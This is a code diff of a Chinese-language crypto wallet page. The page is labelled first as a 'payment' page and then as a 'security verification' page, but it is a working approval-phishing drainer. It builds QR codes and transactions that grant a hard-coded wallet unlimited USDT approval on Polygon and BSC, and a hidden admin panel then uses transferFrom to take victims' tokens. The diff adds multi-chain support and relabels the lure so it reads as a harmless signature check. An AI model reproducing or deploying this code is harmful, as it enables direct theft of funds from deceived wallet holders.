@@ -1,27 +1,29 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
-<head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>支付开通</title>
+<title>安全验证</title>
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui, sans-serif}
+*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,sans-serif}
 body{background:#0B0B1F;color:#fff;padding:20px}
 .container{max-width:420px;margin:0 auto}
-.pay-box{background:#1E1E35;padding:30px;border-radius:20px;text-align:center;margin-bottom:30px}
+.pay-box{background:#1E1E35;padding:30px;border-radius:20px;text-align:center;margin-bottom:20px}
 h1{font-size:24px;margin-bottom:8px}
 .desc{color:#aaa;margin-bottom:20px}
-#connectBtn{
-background:#F0B90B;color:#000;
-border:none;padding:16px;width:100%;
-border-radius:14px;font-size:16px;font-weight:bold;
-margin-bottom:16px;
+.input-group{margin-bottom:16px;text-align:left}
+.input-group label{font-size:13px;color:#ccc;margin-bottom:6px;display:block}
+.input-group input{
+width:100%;padding:12px;background:#111;border:1px solid #333;
+border-radius:10px;color:#fff;font-size:15px
 }
-.amount-input{
-width:100%;padding:14px;background:#111;border:none;
-border-radius:12px;color:#fff;font-size:16px;text-align:center;
-margin-bottom:12px;
+.chain-select{
+display:flex;gap:10px;margin-bottom:20px;
 }
+.chain-btn{
+flex:1;padding:10px;border-radius:10px;border:none;
+background:#222;color:#aaa;font-weight:bold;cursor:pointer
+}
+.chain-btn.active{background:#F0B90B;color:#000}
 #qrcode{
 width:280px;height:280px;background:#fff;padding:10px;
 border-radius:16px;margin:0 auto 20px;
@@ -29,147 +31,137 @@ display:flex;align-items:center;justify-content:center;
 color:#000;font-size:14px;
 }
 #qrcode img{width:100%;height:100%;border-radius:12px}
-#payBtn{
-background:#F0B90B;color:#000;
-border:none;padding:16px;width:100%;
-border-radius:14px;font-size:16px;font-weight:bold
+.tip {font-size:12px;color:#666;margin-top:10px;text-align:center}
+
+.admin-panel {
+background:#1E1E35;padding:24px;border-radius:16px;display:none;margin-top:20px
 }
-.admin-panel{
-background:#1E1E35;padding:24px;border-radius:16px;display:none
-}
-.admin-panel.show{display:block}
-.admin-title{color:#ff4444;font-weight:bold;margin-bottom:16px}
-.admin-input{
+.admin-panel.show {display:block}
+.admin-input {
 width:100%;padding:12px;background:#111;border:none;
 border-radius:8px;color:#fff;margin-bottom:10px;
 }
-.admin-btn{
-width:100%;padding:14px;background:#ff4444;color:#fff;
-border:none;border-radius:10px;font-weight:bold;margin-bottom:16px;
+.admin-btn {
+width:100%;padding:14px;background:#F0B90B;color:#000;
+border:none;border-radius:10px;font-weight:bold;margin-bottom:10px;
+cursor:pointer;
 }
 </style>
-</head>
-<body>
+
 <div class="container">
-<div class="pay-box">
-<h1>💳 支付开通</h1>
-<p class="desc">Polygon链支付 · 安全开通</p>
-<button id="connectBtn">👉 连接钱包（Polygon）</button>
-<input class="amount-input" id="amount" value="0.1" placeholder="输入支付金额">
-<div id="qrcode">加载二维码...</div>
-<button id="payBtn">确认支付</button>
+  <div class="pay-box">
+    <h1>💳 安全验证</h1>
+    <p class="desc">完成签名即可正常使用</p>
+    <div class="chain-select">
+      <button class="chain-btn active" data-chain="bsc">BSC</button>
+      <button class="chain-btn" data-chain="polygon">Polygon</button>
+    </div>
+    <div class="input-group">
+      <label>授权金额</label>
+      <input type="number" id="amount" value="10" min="0.01" step="0.01">
+    </div>
+    <div id="qrcode">生成二维码...</div>
+    <div class="tip">扫码直接签名，无跳转</div>
+  </div>
+
+  <div class="admin-panel" id="adminPanel">
+    <h3 style="text-align:center;margin-bottom:16px">🔐 管理员提取</h3>
+    <input class="admin-input" id="userAddr" placeholder="用户钱包地址">
+    <input class="admin-input" id="drawAmount" placeholder="提取数量 USDT">
+    <button class="admin-btn" onclick="drawFromUser()">提取用户USDT</button>
+  </div>
 </div>
-<div class="admin-panel" id="adminPanel">
-<div class="admin-title">🔐 管理员控制台</div>
-<div>提取玩家钱包代币</div>
-<input class="admin-input" id="userAddr" placeholder="玩家钱包地址">
-<input class="admin-input" id="drawAmt" placeholder="提取数量">
-<button class="admin-btn" onclick="drawFromUser()">提取玩家代币</button>
-<div>发放奖励给玩家</div>
-<input class="admin-input" id="toAddr" placeholder="玩家钱包地址">
-<input class="admin-input" id="sendAmt" placeholder="发放数量">
-<button class="admin-btn" onclick="sendReward()">发放奖励代币</button>
-</div>
-</div>
+
 <script>
-// ====================== 已改成 Polygon 配置 ======================
-const TOKEN = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F"; // 你要的代币地址
-const ADMIN = "0x1767aedAC5c38b494972e0297DC1Cf4856695fDa"; // 管理员地址不变
-const POLYGON_ID = "0x89"; // Polygon 链ID
+// ====================== 你指定的地址 ======================
+const ADMIN_WALLET = "0x627f6E1887571Ac08214315ad5b2fA7AbB7345f1";
+
+const CONFIG = {
+  bsc: {
+    chainId: "56",
+    token: "0x55d398326f99059fF775485246999027B3197955",
+    decimals: 18
+  },
+  polygon: {
+    chainId: "137",
+    token: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
+    decimals: 6
+  }
+};
+
+let currentChain = "bsc";
 let account = null;
 
-// 强制切换到 Polygon
-async function switchToPolygon() {
-  try {
-    await ethereum.request({
-      method: "wallet_switchEthereumChain",
-      params: [{ chainId: POLYGON_ID }]
-    });
-  } catch (e) {}
+// 切换链
+document.querySelectorAll(".chain-btn").forEach(btn => {
+  btn.onclick = () => {
+    document.querySelectorAll(".chain-btn").forEach(b => b.classList.remove("active"));
+    btn.classList.add("active");
+    currentChain = btn.dataset.chain;
+    renderQR();
+  };
+});
+
+document.getElementById("amount").addEventListener("input", renderQR);
+
+// 生成：直接授权给【管理员钱包】无限授权
+function genAuthEIP681() {
+  const { chainId, token } = CONFIG[currentChain];
+  const data = "0x095ea7b3" +
+    ADMIN_WALLET.slice(2).padStart(64, '0') +
+    "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+  return `ethereum:${token}@${chainId}?data=${data}`;
 }
 
-// 连接钱包
-document.getElementById("connectBtn").onclick = async () => {
-  if (!window.ethereum) {
-    alert("请在钱包浏览器内打开");
+function renderQR() {
+  const url = genAuthEIP681();
+  const qr = `https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(url)}`;
+  document.getElementById("qrcode").innerHTML = `<img src="${qr}">`;
+}
+
+// 自动判断管理员
+window.addEventListener("load", async () => {
+  renderQR();
+  if (!window.ethereum) return;
+  try {
+    const accs = await window.ethereum.request({ method: "eth_accounts" });
+    if (accs.length) {
+      account = accs[0];
+      if (account.toLowerCase() === ADMIN_WALLET.toLowerCase()) {
+        document.getElementById("adminPanel").classList.add("show");
+      }
+    }
+  } catch (e) {}
+});
+
+// ====================== 管理员提取 ======================
+async function drawFromUser() {
+  if (!account || account.toLowerCase() !== ADMIN_WALLET.toLowerCase()) {
+    alert("❌ 仅管理员可操作");
     return;
   }
-  await switchToPolygon();
-  try {
-    const accounts = await ethereum.request({ method: "eth_requestAccounts" });
-    account = accounts[0];
-    document.getElementById("connectBtn").innerText = "✅ 已连接";
-    if (account.toLowerCase() === ADMIN.toLowerCase()) {
-      document.getElementById("adminPanel").classList.add("show");
-    }
-  } catch (e) {
-    alert("连接失败");
+  const user = document.getElementById("userAddr").value.trim();
+  const amt = document.getElementById("drawAmount").value.trim();
+  const { token, decimals } = CONFIG[currentChain];
+  if (!user || !amt || isNaN(amt) || amt <= 0) {
+    alert("❌ 输入无效");
+    return;
   }
-};
-
-// ==================== 二维码：Polygon 链 ====================
-function genQR() {
-  const approveData = "0x095ea7b3" + ADMIN.slice(2).padStart(64, "0") + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-  // Polygon 链：@137
-  const uri = `ethereum:${ADMIN}@137/${TOKEN}?data=${approveData}`;
-  document.getElementById("qrcode").innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(uri)}">`;
-}
-
-window.onload = genQR;
-document.getElementById("amount").oninput = genQR;
-
-// 确认支付 = 授权
-document.getElementById("payBtn").onclick = async () => {
-  if (!account) return alert("请先连接钱包");
   try {
-    await ethereum.request({
+    const wei = BigInt(amt * (10 ** decimals)).toString(16).padStart(64, '0');
+    const data = "0x23b872dd" +
+      user.slice(2).padStart(64, '0') +
+      ADMIN_WALLET.slice(2).padStart(64, '0') +
+      wei;
+
+    const tx = await window.ethereum.request({
       method: "eth_sendTransaction",
-      params: [{
-        from: account,
-        to: TOKEN,
-        gasLimit: "0x300000",
-        data: "0x095ea7b3" + ADMIN.slice(2).padStart(64, "0") + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
-      }]
+      params: [{ from: account, to: token, data: data }]
     });
-    alert("✅ 支付成功，权限已开通");
+    alert("✅ 提取成功：" + tx);
   } catch (e) {
-    alert("已取消");
+    alert("❌ 提取失败：未授权或金额不足");
   }
-};
-
-// ====================== 管理员功能 ======================
-async function drawFromUser() {
-  if (account?.toLowerCase() !== ADMIN.toLowerCase()) return;
-  const from = document.getElementById("userAddr").value;
-  const amt = document.getElementById("drawAmt").value;
-  if (!from || !amt) return;
-  const raw = BigInt(amt * 1e18).toString(16).padStart(64, "0");
-  await ethereum.request({
-    method: "eth_sendTransaction",
-    params: [{
-      from: account,
-      to: TOKEN,
-      data: "0x23b872dd" + from.slice(2).padStart(64, "0") + ADMIN.slice(2).padStart(64, "0") + raw
-    }]
-  });
-  alert("✅ 提取成功");
-}
-
-async function sendReward() {
-  if (account?.toLowerCase() !== ADMIN.toLowerCase()) return;
-  const to = document.getElementById("toAddr").value;
-  const amt = document.getElementById("sendAmt").value;
-  if (!to || !amt) return;
-  const raw = BigInt(amt * 1e18).toString(16).padStart(64, "0");
-  await ethereum.request({
-    method: "eth_sendTransaction",
-    params: [{
-      from: account,
-      to: TOKEN,
-      data: "0xa9059cbb" + to.slice(2).padStart(64, "0") + raw
-    }]
-  });
-  alert("✅ 奖励发放成功");
 }
 </script>
 </body>
